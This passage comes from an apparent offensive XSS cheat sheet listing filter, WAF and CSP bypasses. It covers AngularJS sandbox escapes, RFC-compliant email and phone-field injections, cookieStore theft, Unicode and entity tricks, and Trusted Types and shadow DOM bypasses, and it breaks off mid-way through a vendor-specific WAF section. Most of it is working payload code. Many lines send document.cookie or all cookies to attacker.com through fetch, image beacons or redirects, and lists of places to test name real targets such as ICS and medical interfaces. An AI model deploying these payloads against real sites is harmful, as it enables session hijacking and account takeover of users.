**Bypass logic:** AngularJS 1.x has an expression sandbox preventing direct `Function()` constructor access in template expressions (`{{ }}`). Each version has a unique mechanism that can be escaped via prototype chain manipulation, `$evalAsync` timing, or method override. Post-1.6, the sandbox was removed — making direct `{{constructor.constructor('alert(1)')()}}` always work. WAF bypass: the string `constructor` can be split into parts concatenated at runtime (never appearing as a single keyword in source).
**Attack chain:** User input reflected in Angular template context (`ng-bind-html`, unescaped `{{ }}`) → CSTI → version-matched sandbox escape → arbitrary JS → ATO

**Payload:**
```javascript
// Angular 1.6+ (sandbox removed — works directly):
{{constructor.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}
{{$eval.constructor('alert(document.cookie)')()}}
{{0[a='constructor'][a]('alert(1)')()}}

// Angular 1.5.9-1.5.11:
{{
  c=''.sub.call;b=''.sub.bind;a=b(c,b,b(c,c,
  c(c,c,b(c,b,b(c,b,b(c,b,a,'alert(1)'))))))));a=a();b(a)()
}}

// Angular 1.4.x:
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}

// Angular 1.3.x:
{{{}[{toString:[].join,length:1,0:'__proto__'}][{toString:[].join,length:1,0:'valueOf'}]=alert(1)}}

// Angular 1.2.x:
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// Angular 1.0.1-1.1.5:
{{constructor.constructor('alert(1)')()}}

// Without any quotes (all versions — for quote-filtered contexts):
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}

// WAF bypass — split "constructor" keyword (bypass Imperva and similar):
{{['constr','uctor'].join('').constructor('alert(1)')()}}
{{[]['fil'+'ter']['con'+'structor']('alert(1)')()}}

// WAF bypass — reconstruct via toString(36) without any literal strings:
// parseInt('constructor', 36) → used in number-to-string chains
{{(1)[['con','str','uctor'].join('')]['con','str','uctor'].join('')]('alert(1)')()}}
```

**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md

---

## Bypass Matrix (Updated 2026-05-27)

### New Entries — Techniques Added 2026-05-27

| Filter / Defense | Bypass Technique | Payload Example |
|-----------------|------------------|-----------------|
| `<>` ASCII angle brackets blocked | Full-width Unicode variants | `＜img src=x onerror=alert(1)＞` |
| WAF event-handler name matching | Null byte in attribute name | `<img src=x onerror%00=alert(1)>` |
| Parentheses `()` + keyword blocked | Array method invocation | `[7].map(alert)` |
| Keyword blocked (no `alert` string) | Regex `.source` reconstruction | `top[/al/.source+/ert/.source](8)` |
| All keywords + characters filtered | JSFuck obfuscation | `[][(![]+[])[+[]]+...]` (uses only `[]!()`) |
| CSP `strict-dynamic` + HTML injection | DOM clobbering → script.src | `<a id=config><a id=config name=codeBasePath href="//attacker.com/x.js#">` |
| Nonce-based CSP (with HTML/CSS injection) | CSS attr selector oracle + bfcache | `script[nonce^="a"]{background:url(//attacker.com/n?c=a)}` → steal nonce char-by-char |
| PHP-delivered CSP header | `max_input_vars` overflow | 1001+ request params → PHP warning → CSP header never sent |
| `HttpOnly` cookie flag | Cookie sandwich (RFC2109 legacy parsing) | Set `$Version` + wrap cookies via JS → server reflects HttpOnly cookie in response |
| DOMPurify sanitizer | Prototype pollution depth bypass (CVE-2024-45801) | Pollute depth counter → `NaN` comparison → DOMPurify passes nested XSS |
| AngularJS expression sandbox | Version-specific CSTI escape | `{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}}` |
| WAF blocking `constructor` keyword | String-split + join reconstruction | `{{['constr','uctor'].join('').constructor('alert(1)')()}}` |
| Strict CSP (no `unsafe-inline`) | Dangling markup injection | `<img src='https://attacker.com/?x=` → slurps CSRF token from page |

### New Sinks Documented 2026-05-27

| Sink | Context | Notes |
|------|---------|-------|
| `script.src` (from clobbered config) | DOM clobbering + strict-dynamic | Clobbered property → trusted script loads attacker URL with inherited trust |
| CSS `background-image` via attr selector | CSS oracle | Side-channel for nonce/attribute value exfil without JS |
| Cookie header reflection (RFC2109) | HttpOnly bypass | Server echoes `Cookie` value in response body → HttpOnly exposed |
| `Array.prototype.map/forEach/findIndex` | Function invocation | Callback invoked without `()` — bypasses paren-blocking WAF |

### CSP Configurations — New Weaknesses (2026-05-27)

| CSP Configuration | Weakness | Bypass |
|------------------|----------|--------|
| `script-src 'strict-dynamic' 'nonce-XYZ'` | HTML injection clobbers config → trusted script loads attacker URL | DOM clobbering → `script.src` carries attacker URL, trust inherited |
| Nonce-based CSP on PHP pages | `max_input_vars` drops CSP header entirely | 1001+ params → PHP E_WARNING → `header()` fails silently |
| Nonce-based CSP + CSS/HTML injection | CSS attribute selector oracle leaks nonce characters | Inject `<style>script[nonce^="X"]{...}` × all chars → reconstruct nonce |
| `script-src 'self'` without `object-src` | `<object data=data:text/html;base64,...>` executes scripts | `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">` |

---

## Email Validator Context XSS (RFC0822 / RFC5322)

**Type:** reflected / stored
**Filter bypassed:** Server-side email validators that use RFC0822 or RFC5322 parsing — they allow characters such as `<`, `>`, `(`, `)` in quoted local parts or comments, which pass validation but land as HTML when reflected
**Bypass logic:** RFC0822 allows `"quoted strings"@domain` where the quoted portion may contain special chars. RFC5322 allows `(comments)` appended to an email address. Both formats permit angle brackets and event-handler characters that a permissive validator accepts but which the HTML renderer then executes.
**Attack chain:** XSS payload in email field → passes RFC-compliant validation → reflected/stored in HTML context → script executes → cookie theft → ATO

**Payloads:**
```html
<!-- RFC0822: quoted local-part contains XSS payload -->
"><svg/onload=confirm(1)>"@x.y

<!-- RFC5322: comment appended after valid email -->
xss@example.com(<img src='x' onerror='alert(document.location)'>)

<!-- Angle brackets in display name context (some mail clients / web UIs) -->
User Name <"><img src=x onerror=alert(document.cookie)>

<!-- Injecting into a mailto: link rendered server-side -->
"onmouseover=alert(1) a="@b.com

<!-- With full cookie exfil -->
"><script src=//attacker.com/x.js>"@x.y
```

**Where to test:**
- Registration / profile update email fields
- Newsletter subscription forms
- "Add team member" email inputs
- Contact form "reply-to" email field
- Invitation systems that render the email address in HTML responses

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Tel URI / Phone Input XSS (RFC3966)

**Type:** reflected / stored
**Filter bypassed:** Phone number validators that accept RFC3966 `phone-context` parameters — the `phone-context` value is a freeform domain/IP descriptor that is not sanitized when the full tel: URI string is reflected in HTML
**Bypass logic:** RFC3966 defines the `tel:` URI scheme. A `phone-context` parameter (`;phone-context=...`) is appended after the subscriber number and may contain arbitrary text. Validators checking only the numeric portion before the semicolon pass the value; when the full string is echoed into an HTML attribute or template, the `phone-context` payload breaks out.
**Attack chain:** XSS in phone field → RFC3966 context parameter carries payload → validator checks number portion only → reflected in HTML → executes

**Payloads:**
```html
<!-- phone-context parameter contains closing bracket + XSS -->
+330011223344;phone-context=<script>alert(0)</script>

<!-- Into href attribute: tel: URI reflected as link href -->
+1-800-555-0100;phone-context=javascript:alert(document.cookie)

<!-- Attribute break-out when phone is reflected inside double-quoted attribute -->
+1234567890";onmouseover="alert(1)

<!-- Stored variant — inject in profile "phone" field -->
+1234567890<img src=x onerror=alert(document.cookie)>
```

**Where to test:**
- User profile phone number fields
- Checkout / billing phone fields
- 2FA phone number entry (less likely to be HTML-reflected but worth checking)
- Click-to-call links (`<a href="tel:...">`) generated from user input

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## `window.cookieStore` — Chromium Cookie API (document.cookie Blacklist Bypass)

**Type:** stored / reflected (post-XSS exploitation)
**Filter bypassed:** WAF / sanitizer keyword rules blocking the string `document.cookie` in payloads; also bypasses server-side input filters rejecting `document.cookie` as a literal string
**Bypass logic:** Chrome 87+, Edge, and Opera expose the `CookieStore` API (`window.cookieStore`) as an async alternative to `document.cookie`. It returns an object with `name` and `value` properties and is entirely absent from most WAF keyword block lists. Because it uses Promises, it also evades synchronous `eval` detection. It reads the same cookies as `document.cookie` including session tokens (but NOT `HttpOnly` ones — for those, combine with the Cookie Sandwich technique).
**Attack chain:** WAF blocks `document.cookie` keyword → use `window.cookieStore.get()` → exfiltrate same cookie values → session hijack → ATO

**Payloads:**
```javascript
// Exfil a specific cookie by name (async)
<img src=x onerror="
  window.cookieStore.get('session').then(c=>{
    fetch('https://attacker.com/steal?v='+c.value)
  })
">

// Exfil all cookies
<svg onload="
  window.cookieStore.getAll().then(cs=>{
    fetch('https://attacker.com/steal?c='+btoa(JSON.stringify(cs.map(c=>c.name+'='+c.value))))
  })
">

// Compact one-liner (no document.cookie string anywhere)
<script>cookieStore.getAll().then(c=>new Image().src='//x.com/?'+btoa(JSON.stringify(c)))</script>

// When combined with no-parens bypass:
<img src=x onerror="cookieStore.getAll().then(c=>[c].map(fetch.bind(0,'//attacker.com/?d=')))">
```

**Supported:** Chrome 87+, Edge 87+, Opera 73+. Not supported in Firefox or Safari (fall back to `document.cookie` in those).

**Source:** https://developer.mozilla.org/en-US/docs/Web/API/CookieStore ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Unicode Typecase Confusion (ſvg / ıframe)

**Type:** reflected / stored
**Filter bypassed:** WAF rules that blocklist HTML tag names in a normalized form (`svg`, `script`, `iframe`) but apply the check to the uppercased or lowercased version of input — certain Unicode characters uppercase/lowercase to ASCII letters in a non-obvious way
**Bypass logic:** The Unicode character `ſ` (U+017F, LATIN SMALL LETTER LONG S) uppercases to `S` in many locale-aware string comparisons. `ı` (U+0131, LATIN SMALL LETTER DOTLESS I) uppercases to `I`. A WAF doing `input.toUpperCase().includes('SCRIPT')` will match `ſcript` → `SCRIPT`. But a WAF doing `input.toLowerCase().includes('script')` will NOT match `ſcript` because `ſ`.toLowerCase() = `ſ` (stays the same). Browsers that use HTML5 tag name normalization may accept `<ſvg>` as `<svg>` or reject it — behavior varies, making it effective against inconsistent WAF/browser combinations.
**Attack chain:** WAF lowercase check misses `ſvg` → browser normalizes to `svg` → `onload` event fires → XSS

**Payloads:**
```html
<!-- ſ (U+017F) — long s, uppercases to S -->
<ſcript>alert(1)</ſcript>
<ſvg onload=alert(1)>

<!-- ı (U+0131) — dotless i, uppercases to I -->
<ıframe src=javascript:alert(1)>
<ıframe onload=alert(1) src=x>

<!-- Combined unicode variant -->
<ſvg/onload=alert(document.cookie)>
<ıframe/src='javascript:alert(1)'>

<!-- Works especially well in Turkish locale environments (dotless i → I in Turkish) -->
<!-- Turkish locale: toUpperCase('i') = 'İ' (dotted) but toUpperCase('ı') = 'I' (ASCII) -->
<!-- This means a Turkish-locale WAF may fail to match 'script' if ı is used for 'i' -->

<!-- Fuzzing approach: replace each letter with its Unicode lookalike -->
<scrípt>alert(1)</scrípt>    <!-- í = U+00ED, may upper/lower differently -->
<scrıpt>alert(1)</scrıpt>    <!-- ı = U+0131 dotless i -->
```

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#unicode-bypass

---

## ECMAScript6 Named Entity Backtick (`&DiacriticalGrave;`)

**Type:** reflected / stored
**Filter bypassed:** WAF / sanitizers blocking the backtick character (`` ` `` U+0060) in JavaScript contexts — used to prevent template literal invocation of functions like `alert\`1\``
**Bypass logic:** HTML5 defines a named character reference `&DiacriticalGrave;` that maps to the backtick character (U+0060). When this entity appears inside a `<script>` block, the HTML parser decodes it to a backtick before the JavaScript engine sees the source. A WAF inspecting the raw bytes sees only the entity string `&DiacriticalGrave;` — no backtick to block. The JavaScript engine receives a valid template literal invocation.
**Attack chain:** WAF blocks raw backtick → `&DiacriticalGrave;` decoded by HTML parser before JS execution → template literal call fires → XSS

**Payloads:**
```html
<!-- HTML parser decodes &DiacriticalGrave; to ` before JS engine parses -->
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
<script>confirm&DiacriticalGrave;document.cookie&DiacriticalGrave;</script>

<!-- Works because script content is decoded before JS parsing -->
<script>fetch&DiacriticalGrave;https://attacker.com/steal?c=${document.cookie}&DiacriticalGrave;</script>

<!-- Combined with no-parens throw technique -->
<script>onerror=alert;throw&DiacriticalGrave;xss&DiacriticalGrave;</script>

<!-- Using &#96; decimal entity for the same effect -->
<script>alert&#96;1&#96;</script>

<!-- Hex entity variant -->
<script>alert&#x60;1&#x60;</script>
```

**Note:** Only works within `<script>` blocks where HTML entity decoding occurs before JS parsing. Does NOT work in external .js files (no HTML parsing there) or in `eval()` strings.

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Semicolon-Free Expression Chaining (Operator Separators)

**Type:** reflected / stored / DOM
**Filter bypassed:** WAF / regex rules blocking the semicolon `;` as a JavaScript statement terminator — some WAFs flag `alert(1);` or `eval(...);` patterns and strip the semicolon, breaking the payload
**Bypass logic:** JavaScript expressions can be chained using arithmetic operators (`*`, `/`, `+`, `-`) and the ternary operator (`? :`). When these operators appear between two expressions, JavaScript evaluates both sides and discards the result — effectively executing both without a semicolon. This allows multi-statement payloads that avoid `;` entirely.
**Attack chain:** Semicolon-blocking WAF → operator-chained expressions execute both sides → arbitrary JS runs → cookie theft → ATO

**Payloads:**
```javascript
// Arithmetic operator as statement separator (result is discarded)
'te' * alert(document.cookie) * 'xt'
'x' / alert(1) / 'y'
'x' - alert(1) - 'y'
'' + alert(1) + ''

// Ternary operator as separator
'' ? alert(1) : ''
true ? alert(document.cookie) : false

// In event handler context (semicolon between handlers blocked)
<img src=x onerror="'x'*alert(1)*'y'">
<svg onload="''*fetch('https://attacker.com/?c='+document.cookie)*''">

// Chaining multiple effects without semicolons
// Exfil + redirect: both sides of * execute
<svg onload="'x'*fetch('https://attacker.com/?c='+document.cookie)*document.location.replace('about:blank')">

// Combined with no-parens (onerror=alert;throw chains naturally without ;)
<img src=x onerror="onerror=alert,throw 1">    // comma operator — also semicolon-free

// Comma operator chains (executes each expression, returns last)
<img src=x onerror="(fetch('https://attacker.com/?c='+document.cookie),1)">
```

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## SVG `eval(id)` Attribute Source Injection

**Type:** reflected / stored
**Filter bypassed:** WAF rules scanning for JavaScript keywords (`alert`, `fetch`, `document`) inside `onload`/`onerror` attribute values — the actual payload is stored in a separate attribute (`id`) that WAFs treat as inert metadata
**Bypass logic:** SVG elements (and other HTML elements) support the `id` attribute as a string. The `onload` handler can call `eval(id)` — fetching the element's own `id` attribute value and executing it as JavaScript. The WAF sees the `onload` value as `eval(id)` — no dangerous keywords. The actual XSS payload is in the `id` attribute, which most WAFs allow freely as "just an identifier string".
**Attack chain:** WAF allows `id` attribute freely → `eval(id)` executes the id value as JS → payload in id runs → cookie theft → ATO

**Payloads:**
```html
<!-- id contains the payload, onload evaluates it -->
<svg id="alert(1)" onload="eval(id)">
<svg id="alert(document.cookie)" onload="eval(id)">

<!-- With exfil payload in id -->
<svg id="fetch('https://attacker.com/?c='+document.cookie)" onload="eval(id)">

<!-- img variant -->
<img src=x id="alert(document.cookie)" onerror="eval(id)">

<!-- Using alt attribute instead of id (less monitored) -->
<img src=x alt="alert(document.cookie)" onerror="eval(this.alt)">

<!-- Using title attribute -->
<div title="alert(document.cookie)" onmouseover="eval(this.title)">hover</div>

<!-- Accessing attribute via getAttribute (evades direct id reference blocking) -->
<svg id="alert(1)" onload="eval(getAttribute('id'))">

<!-- className source -->
<img src=x class="fetch('//x.com?c='+document.cookie)" onerror="eval(className)">
```

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Obscure and Less-Known Event Handlers

**Type:** reflected / stored
**Filter bypassed:** WAF / sanitizer event handler blocklists tuned to the ~20 most common handlers (`onclick`, `onmouseover`, `onerror`, `onload`) — obscure handlers are absent from older blocklists
**Bypass logic:** HTML5 and browser APIs define hundreds of event handlers. Handlers for pointer events, clipboard operations, animation events, media state changes, and form interactions are largely absent from WAF blocklists. Testing these against a target's WAF and sanitizer quickly identifies gaps.
**Attack chain:** Common handlers blocked → obscure handler not in WAF list → event fires → XSS

**Payloads:**
```html
<!-- Pointer events — fire on mouse/touch/pen input -->
<div onpointerover="alert(1)">hover</div>
<div onpointerenter="alert(1)">hover</div>
<div onpointerdown="alert(1)">click</div>
<div onpointermove="alert(1)">move</div>
<div onpointerrawupdate="alert(1)">move</div>  <!-- Chrome 77+ -->

<!-- afterscriptexecute — fires after an inline script in object/embed runs -->
<object onafterscriptexecute="confirm(0)"></object>
<object data="data:text/html,<script>1</script>" onafterscriptexecute=alert(1)></object>

<!-- Clipboard events — fire on cut/copy/paste -->
<input oncopy="alert(document.cookie)" value="copy me">
<input oncut="alert(document.cookie)" value="cut me">
<input onpaste="alert(document.cookie)" placeholder="paste here">
<div oncopy="alert(1)" contenteditable>select and copy this</div>

<!-- Drag events -->
<div ondragstart="alert(document.cookie)" draggable="true">drag me</div>
<div ondragend="alert(1)" draggable="true">drag me</div>
<div ondrop="alert(1)">drop zone</div>

<!-- Search input (Chrome) -->
<input type="search" onsearch="alert(1)" autofocus>

<!-- animationstart/end/iteration — fires when CSS animation runs -->
<style>@keyframes x{}</style>
<div style="animation:x" onanimationstart="alert(1)">text</div>
<div style="animation:x 1s" onanimationend="alert(1)">text</div>
<div style="animation:x 0.001s infinite" onanimationiteration="alert(1)">text</div>

<!-- transitionend — fires when CSS transition completes -->
<div style="transition:color 0.001s" ontransitionend="alert(1)" onmouseover="this.style.color='red'">hover</div>

<!-- beforeinput — fires before input value changes (Chrome/Edge) -->
<input oninput="alert(1)" autofocus>
<input onbeforeinput="alert(1)" autofocus>

<!-- scroll event on element -->
<div onscroll="alert(1)" style="overflow:scroll;height:10px"><div style="height:100px">scroll</div></div>

<!-- formdata event — fires when FormData is constructed from a form -->
<form onformdata="alert(1)"><input><button>submit</button></form>

<!-- accesskey trick — fires onclick when user presses CTRL+SHIFT+key -->
<input type="hidden" accesskey="X" onclick="alert(1)">

<!-- toggle event on details element (well-known but often missed in WAF lists) -->
<details ontoggle="alert(1)" open>text</details>
```

**Quick WAF probe list (paste all at once to identify unblocked handlers):**
```
onpointerover onpointerenter onpointerdown onpointermove
onafterscriptexecute oncopy oncut onpaste ondragstart ondrop
onanimationstart onanimationend onanimationiteration ontransitionend
onbeforeinput onformdata onsearch onscroll
```

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Trusted Types Policy Bypass

**Type:** DOM
**Filter bypassed:** `require-trusted-types-for 'script'` CSP directive — the modern DOM XSS mitigation that wraps dangerous sinks and requires `TrustedHTML`/`TrustedScript`/`TrustedScriptURL` objects instead of raw strings
**Bypass logic:** Trusted Types (TT) prevents raw string assignment to sinks like `innerHTML`, `eval`, `setTimeout(string)`, `script.src`. Bypass paths: (1) if the `trusted-types` CSP directive does not restrict policy names, attackers can create their own permissive policy with an unsanitized `createHTML` callback; (2) if a `default` policy exists with weak sanitization, any raw string assignment falls through to it; (3) prototype pollution of the policy's `createHTML` method replaces the sanitizer with a passthrough; (4) TT does not protect `location.href`, `a.href`, or `document.domain` — use these sinks for navigation-based exploitation.
**Attack chain:** TT enforcement blocks raw `innerHTML` → create own policy (if not restricted) or pollute default policy → `createHTML` returns attacker payload as TrustedHTML → `innerHTML` sink executes → XSS → ATO

**Payloads:**
```javascript
// ── Path 1: Create a permissive TT policy (no policy-name restriction in CSP) ──
// Works when CSP says trusted-types without a name allowlist, or allows 'allow-duplicates'
const bypassPolicy = trustedTypes.createPolicy('bypassPolicy', {
  createHTML: (s) => s,        // no sanitization — returns raw string
  createScript: (s) => s,
  createScriptURL: (s) => s,
});
document.getElementById('target').innerHTML =
  bypassPolicy.createHTML('<img src=x onerror=alert(document.cookie)>');

// ── Path 2: Default policy abuse ──
// If the app defines a default policy without proper sanitization:
// (attacker exploits it by passing payload to any innerHTML assignment)
// App code: document.body.innerHTML = userInput
// → falls through to default policy's createHTML(userInput) → XSS

// ── Path 3: Prototype pollution disabling sanitizer ──
// Pollute Object.prototype so createHTML is a passthrough:
Object.prototype.createHTML = (s) => s;
// Now DOMPurify or any sanitizer's createHTML returns raw string

// ── Path 4: Non-protected sinks (TT does NOT cover these) ──
// Navigation sinks — TT doesn't protect href assignments:
location.href = 'javascript:alert(document.cookie)';
document.querySelector('a').href = 'javascript:alert(1)';

// document.domain can be changed without TT restriction:
document.domain = 'attacker.com';

// eval() via Function constructor through worker (may not enforce TT):
const w = new Worker(URL.createObjectURL(new Blob([
  'self.onmessage=e=>eval(e.data)'
], {type:'application/javascript'})));
w.postMessage('alert(1)');

// ── Path 5: Enumerate existing policies to find permissive ones ──
console.log(trustedTypes.getPolicyNames());
// → If any policy name suggests passthrough ('debug', 'legacy', 'compat')
//   try passing your payload through that policy

// ── Detection ──
// Check if TT is enforced:
try { document.body.innerHTML = 'test' } catch(e) { console.log('TT enforced:', e.message) }
// Check policy names available:
window.trustedTypes && trustedTypes.getPolicyNames()
```

**What TT protects vs. doesn't protect:**
```
PROTECTED (require TrustedHTML/Script/ScriptURL):
  innerHTML, outerHTML, insertAdjacentHTML, document.write
  eval, setTimeout(string), setInterval(string), new Function(string)
  script.src, script.text, script.innerText
  Worker constructor with string URL
  ServiceWorker registration URL

NOT PROTECTED (TT has no coverage):
  location.href, location.replace, location.assign
  a.href, form.action, iframe.src (via DOM property, sometimes)
  document.domain
  CSS injection sinks (style.cssText)
```

**Source:** https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API ; https://w3c.github.io/trusted-types/dist/spec/

---

## Shadow DOM Open Root XSS

**Type:** DOM / stored
**Filter bypassed:** Sanitizers that only inspect the main document DOM — shadow DOM content is not traversed by `document.querySelectorAll` or `DOMPurify` when sanitizing the outer document; also bypasses observers and security scanners that don't pierce shadow roots
**Bypass logic:** Web Components use shadow DOM to encapsulate markup. When `attachShadow({mode: 'open'})` is used, the shadow root is accessible via `element.shadowRoot` from any JavaScript in the parent page. Critically: (1) script executed inside a shadow DOM has full access to the parent document — `document.cookie`, `localStorage`, fetch — because JS scope is shared; (2) `innerHTML` of the shadow root is a regular DOM sink not covered by TT in some implementations; (3) slotted content (`<slot>`) is rendered in the shadow but lives in the light DOM, creating a boundary confusion vector.
**Attack chain:** User-controlled content assigned to `shadowRoot.innerHTML` → no sanitization (scanner missed shadow DOM) → XSS payload in shadow root → script accesses parent `document.cookie` → exfil → ATO

**Payloads:**
```javascript
// Vulnerable pattern: app assigns user content to shadow root innerHTML
class UserCard extends HTMLElement {
  connectedCallback() {
    this.attachShadow({mode: 'open'});
    this.shadowRoot.innerHTML = this.getAttribute('data-bio');  // sink!
  }
}
// Exploit: set data-bio to XSS payload — shadow DOM innerHTML not sanitized
// <user-card data-bio='<img src=x onerror=alert(document.cookie)>'></user-card>

// From parent JS — accessing open shadow root and injecting:
document.querySelector('my-component').shadowRoot.innerHTML =
  '<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>';

// Slot injection: slotted content lives in light DOM (not encapsulated)
// If a web component renders <slot> without sanitizing slotted children:
document.querySelector('my-widget').innerHTML =
  '<script slot="content">alert(document.cookie)</script>';
// → script in light DOM executes in parent context

// Intercepting attachShadow to downgrade closed → open:
const origAttachShadow = Element.prototype.attachShadow;
Element.prototype.attachShadow = function(init) {
  return origAttachShadow.call(this, {...init, mode: 'open'});
};
// → All shadow roots now accessible via .shadowRoot even if originally closed

// Checking if a component has an open shadow root:
document.querySelectorAll('*').forEach(el => {
  if (el.shadowRoot) {
    console.log('Open shadow root on:', el.tagName, el.shadowRoot.innerHTML);
  }
});
```

**Key facts:**
- `mode: 'open'` → `element.shadowRoot` is accessible → inject via property
- `mode: 'closed'` → `element.shadowRoot` is `null` BUT: the shadow root reference is often stored in a variable accessible via closure or prototype chain manipulation
- JS inside shadow DOM has full access to `document`, `window`, cookies, etc. — shadow DOM only encapsulates CSS and HTML structure, NOT JS access
- XSS inside shadow DOM = full parent document access = same impact as regular XSS

**Source:** https://developer.mozilla.org/en-US/docs/Web/Web_Components/Using_shadow_DOM ; https://portswigger.net/web-security/cross-site-scripting

---

## CSS `expression()` and `-moz-binding` Legacy XSS

**Type:** reflected / stored
**Filter bypassed:** Input sanitizers and WAFs that allow `<style>` blocks or `style=""` attributes but only block HTML event handlers and `<script>` tags — legacy IE and Firefox XSS sinks hidden inside CSS property values
**Bypass logic:** Two legacy browser paths: (1) IE `expression()` — Internet Explorer (all versions) executes arbitrary JavaScript inside CSS property value `expression(...)`. Fully deprecated in modern browsers but critical in enterprise intranets and OT/ICS environments still running IE. (2) Firefox XBL `-moz-binding` — Firefox (pre-v56) loads an XBL document from a URL specified in `-moz-binding` CSS property; the XBL document can contain `<script>` tags. Both paths allow XSS with zero JavaScript visible in the HTML markup — only CSS.
**Attack chain:** User-controlled CSS property value → IE parses `expression()` or Firefox loads XBL → JS executes → cookie theft → ATO

**Payloads:**
```css
/* IE expression() — any CSS property accepts expression() in IE */
<div style="width: expression(alert(document.cookie))">text</div>
<div style="color: expression(alert(1))">text</div>
<div style="background: expression(fetch('https://attacker.com/?c='+document.cookie))">text</div>

/* Inside <style> block — affects ALL matching elements */
<style>
* { color: expression(alert(document.cookie)) }
div { width: expression(fetch('https://attacker.com/?c='+document.cookie)) }
body { background: expression(document.location='https://attacker.com/steal?c='+document.cookie) }
</style>

/* IE expression with more complex payloads */
<div style="width:expression(eval(String.fromCharCode(97,108,101,114,116,40,49,41)))">
```

```xml
<!-- Firefox -moz-binding: loads XBL from data URI -->
<!-- Inject into <style> or style attribute (Firefox < 56) -->
<style>
div {
  -moz-binding: url("data:text/xml;charset=utf-8;base64,PD94bWwgdmVyc2lvbj0iMS4wIj8+CjxiaW5kaW5ncyB4bWxucz0iaHR0cDovL3d3dy5tb3ppbGxhLm9yZy94dWwvMSI+CiAgPGJpbmRpbmcgaWQ9InhzcyI+CiAgICA8aW1wbGVtZW50YXRpb24+CiAgICAgIDxjb25zdHJ1Y3Rvcj48IVtDREFUQVsgYWxlcnQoZG9jdW1lbnQuY29va2llKSBdXT48L2NvbnN0cnVjdG9yPgogICAgPC9pbXBsZW1lbnRhdGlvbj4KICA8L2JpbmRpbmc+CjwvYmluZGluZ3M+#xss")
}
</style>
<!-- Base64 decodes to: XBL that calls alert(document.cookie) in constructor -->

<!-- -moz-binding from external URL (when same-origin allows it) -->
<style>
div { -moz-binding: url(https://attacker.com/xss.xml#xss) }
</style>
<!-- xss.xml contains: <binding id="xss"><implementation><constructor>alert(1)</constructor></implementation></binding> -->

<!-- Via style attribute -->
<div style="-moz-binding:url(data:text/xml;base64,...#xss)">trigger</div>
```

**Where to test in 2026:**
- Corporate intranets with IE11 compatibility mode still enabled
- OT/ICS/SCADA web interfaces (legacy OS environments)
- Government portals with IE-forced compatibility
- Kiosk systems
- Medical device web interfaces

**Source:** https://owasp.org/www-community/attacks/CSS_Injection ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Bracket Notation Dot-Filter Bypass

**Type:** reflected / stored / DOM
**Filter bypassed:** WAFs and input filters blocking the `.` character (dot notation) in JavaScript property access — regex patterns like `/\bdocument\.cookie\b/` or `/alert\(/` that require dot syntax
**Bypass logic:** JavaScript allows any property access via bracket notation: `object.property` is identical to `object['property']`. Dot-notation keyword rules (`document.cookie`, `window.location`) are bypassed by switching to bracket notation. The property string can be further obfuscated via concatenation, `String.fromCharCode`, or `atob()` to avoid matching the plain string.
**Attack chain:** WAF blocks `document.cookie` dot notation → bracket notation bypasses rule → same property accessed → payload executes

**Payloads:**
```javascript
// Direct bracket notation equivalents
window['alert'](document['domain'])
window['eval']('alert(1)')
window['location']['href'] = 'javascript:alert(1)'

// With string concatenation (no literal "document" or "cookie" in source)
window['doc'+'ument']['loc'+'ation']['href']
window['doc'+'ument']['cook'+'ie']

// fromCharCode reconstruction (zero readable property names)
// "alert" → [97,108,101,114,116]
window[String.fromCharCode(97,108,101,114,116)](1)

// "document.cookie" → entirely fromCharCode
window[String.fromCharCode(100,111,99,117,109,101,110,116)]
  [String.fromCharCode(99,111,111,107,105,101)]

// Combining bracket + regex source reconstruction (no strings, no dots)
top[/al/.source+/ert/.source](top[/doc/.source+/ument/.source][/cook/.source+/ie/.source])

// atob-based property access (Base64-encoded property names)
window[atob('YWxlcnQ=')](1)                    // 'alert'
window[atob('ZG9jdW1lbnQ=')][atob('Y29va2ll')] // 'document'['cookie']

// Accessing window.location without dot
window['loc'+'ation'] = 'javascript:alert(1)'

// When inside eval context — numeric property access (arrays)
// Constructing 'alert' via array indexing of string representations:
// "false"[1] = 'a', "false"[2] = 'l', etc.
```

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Vendor-Specific WAF Bypass Techniques

**Type:** reflected / stored / DOM
**Filter bypassed:** Major cloud WAF vendors (Cloudflare, Akamai, Incapsula/Imperva, Fortiweb, WordFence)
**Bypass logic:** Each WAF vendor has distinct rule sets and update cadences. Bypasses that fail against one vendor often succeed against another. The techniques below were confirmed against specific vendors at the date noted; WAFs update regularly, so always verify before use.
**Attack chain:** Vendor WAF blocks generic payload → vendor-specific bypass → WAF misclassifies → XSS reaches application → ATO

**Cloudflare:**
```html
<!-- Random unknown attribute before onload splits Cloudflare's attribute parser -->
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>

<!-- Template literal with prompt (backtick encoding) -->
<svg/OnLoad="`${prompt``}`">

<!-- URL-encoded entity for opening paren -->
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>

<!-- srcdoc iframe with encoded content -->
